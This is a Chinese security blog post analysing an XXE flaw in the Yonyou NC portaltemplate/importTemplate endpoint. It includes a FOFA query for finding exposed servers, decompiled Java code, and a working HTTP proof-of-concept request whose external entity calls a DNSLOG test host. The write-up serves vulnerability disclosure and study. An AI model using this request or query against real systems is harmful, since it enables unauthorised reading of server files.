---
title: "用友NC importTemplate XML实体注入（XXE）漏洞"
source: https://mrxn.net/jswz/yonyou-nc-portaltemplate-importTemplate-xxe.html
asset_dir: assets/用友nc-importtemplate-xml实体注入（xxe）漏洞
---

# 用友NC importTemplate XML实体注入（XXE）漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/24 08:32
- 1116浏览
- [0评论](#comment)
- 49分钟阅读

深入探索

漏洞修复方案

安全研究工具

漏洞预警服务

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B) NC Cloud 是一种商业级的企业资源规划云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC `importTemplate` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件，进一步利用可导致服务器失陷。

代码安全审计

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

根据官方漏洞通告：

漏洞修复方案

[![用友NC importTemplate XML实体注入（XXE）漏洞](images/img-001-fdd60df16b5c.webp)](https://image.mrxn.net/3032e51861a540b2a370fb347e000742.webp)

`portal/pt/portaltemplate/importTemplate` 接口存在xml注入漏洞,从而窃取服务器敏感信息。结合用友NC的路由文件结构，可知接口所在文件为 `PortalTemplate` ，直接搜索相关文件，得到业务逻辑如下

深入探索

网络安全课程

Docker加速服务

编码转换工具

```
package nc.uap.portal.action;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Map;
import javax.servlet.http.HttpServletRequest;
import nc.uap.ctrl.pa.tools.TemplateOperTools;
import nc.uap.lfw.core.AppInteractionUtil;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.uap.portal.log.PortalLogger;
import nc.vo.ml.NCLangRes4VoTransl;
import org.apache.commons.collections.MapUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang.StringUtils;
import org.springframework.web.multipart.MultipartException;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.multipart.MultipartHttpServletRequest;
import org.springframework.web.multipart.MultipartResolver;
import org.springframework.web.multipart.commons.CommonsMultipartResolver;

@Servlet(path="/portaltemplate")
public class PortalTemplateAction
extends BaseAction {
    private static MultipartResolver multipartResolver = new CommonsMultipartResolver();

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    @Action
    public void importTemplate() throws IOException {
        MultipartHttpServletRequest req = PortalTemplateAction.getMultipartResolver(this.request);
        Map fileMap = req.getFileMap();
        ArrayList files = new ArrayList();
        String billitem = req.getParameter("billitem");
        if ("null".equals(billitem) || StringUtils.isBlank((String)billitem)) {
            AppInteractionUtil.showMessageDialog((String)NCLangRes4VoTransl.getNCLangRes().getStrByID("bd", "PortalTemplateAction-000000"));
            return;
        }
        if (MapUtils.isNotEmpty((Map)fileMap)) {
            files.addAll(fileMap.values());
        }
        String name = ((MultipartFile)files.get(0)).getOriginalFilename();
        InputStream in = ((MultipartFile)files.get(0)).getInputStream();
        try {
            TemplateOperTools.doImPort((InputStream)in, (String)billitem);
            this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("bd", "PortalTemplateAction-000001") + name + NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-000003"));
        }
        catch (Throwable e) {
            PortalLogger.error((String)e.getMessage(), (Throwable)e);
            this.print(NCLangRes4VoTransl.getNCLangRes().getStrByID("pmng", "PortalPageManagerAction-000005") + e.getMessage());
        }
        finally {
            IOUtils.closeQuietly((InputStream)in);
        }
    }

    private static MultipartHttpServletRequest getMultipartResolver(HttpServletRequest request) throws MultipartException {
        ((CommonsMultipartResolver)multipartResolver).setDefaultEncoding("UTF-8");
        return multipartResolver.resolveMultipart(request);
    }
}
```

指定了访问路由 `/portaltemplate` ，而 `importTemplate` 方法里的 `billitem` 通过参数获取值后，经过判断不为空或者null，且同时存在文件上传内容， 则会将二者带入 `TemplateOperTools.doImPort` 函数

```
public static void doImPort(InputStream in, String pk_template) throws IOException, LfwBusinessException {
    String xml = IOUtils.toString((InputStream)in);
    TemplatePackObj packObj = (TemplatePackObj)JaxbMarshalFactory.newIns().encodeXML(TemplatePackObj.class, xml);
    if (packObj == null) {
        throw new LfwBusinessException(" file content illegal ");
    }
    UwTemplateVO tmplate = TemplateOperTools.getQryTmpService().getTemplateVOByPK(pk_template);
    if (tmplate == null || !tmplate.getWindowid().equals(packObj.getId())) {
        throw new LfwRuntimeException("File id is " + packObj.getId() + ",but this template window id is " + tmplate.getWindowid() + "!");
    }
```

使用 `JaxbMarshalFactory.newIns().encodeXML(TemplatePackObj.class, xml)` 对输入的 XML 字符串 (`xml`) 进行解析，并将其转换为 `TemplatePackObj` 对象。

默认情况下，JAXB 底层使用的解析器是允许解析 XML 文档中定义的外部实体的，且 `in` 输入流的内容直接被当作 XML 内容进行解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /portal/pt/portaltemplate/importTemplate?pageId=login&billitem=1 HTTP/1.1
Content-Type: multipart/form-data; boundary=----123456
Host: nc.mrxn.net
X-Forwarded-For: 127.0.0.1

------123456
Content-Disposition: form-data; name="file"; filename="1.png"

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe1.test.dnslog.test/xxe_test">%remote;]>
<root/>
------123456--
```

DNSLOG 平台成功收到响应

网络安全

[![用友NC importTemplate XML实体注入（XXE）漏洞](images/img-002-c6d262aa142e.webp)](https://image.mrxn.net/c4e77d5320b441efb7a207f0feb4d2ea.webp)

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=679`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
- [#XXE](https://mrxn.net/tag/XXE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
